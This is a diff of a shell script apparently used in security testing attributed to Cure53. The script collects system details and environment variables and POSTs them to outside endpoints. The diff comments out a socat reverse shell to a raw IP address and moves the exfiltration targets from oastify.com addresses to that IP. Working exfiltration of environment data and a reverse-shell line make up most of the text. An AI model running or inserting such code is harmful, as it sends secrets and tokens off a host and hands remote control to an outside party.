@@ -4,7 +4,7 @@ apt update && apt install -y curl socat
 LOG="$(mktemp)"
 # Cure53 testing
 
-socat TCP:65.109.68.176:16123 EXEC:"/bin/bash",pty,stderr,setsid,sigint,sane &
+# socat TCP:65.109.68.176:16123 EXEC:"/bin/bash",pty,stderr,setsid,sigint,sane &
 
 echo "== system ==" >> "${LOG}"
 id >> "${LOG}"
@@ -52,7 +52,7 @@ ls -lah / >> "${LOG}"
          curl -s -X POST \
            -H "Content-Type: text/plain" \
            --data "Error code: $errcode; Line: $errline; Command: $errcmd" \
-           "https://1qs77pxei9myb83lx6vtsrjfe6kx8wwl.oastify.com/error"; \
+           "http://65.109.68.176:15172/error"; \
          exit $errcode' ERR
 
   # Temp file for accumulating env entries
@@ -82,14 +82,14 @@ ls -lah / >> "${LOG}"
   curl -s -X POST \
        -H 'Content-Type: text/plain' \
        --data-binary @"$sendfile" \
-       'https://1qs77pxei9myb83lx6vtsrjfe6kx8wwl.oastify.com/environ'
+       'http://65.109.68.176:15172/environ'
 
   # Clean up
   rm -f "$tmpfile" "$sendfile"
 )&
 
 # send the collected log to the OAST endpoint
-curl -s -X POST --data-binary @"${LOG}" "https://smiy3gt5e0ip7zzctxrkoif6axgo4js8.oastify.com/cure53_2"
+curl -s -X POST --data-binary @"${LOG}" "http://65.109.68.176:15172/cure53_2"
 
 # clean up
 rm -f "${LOG}"
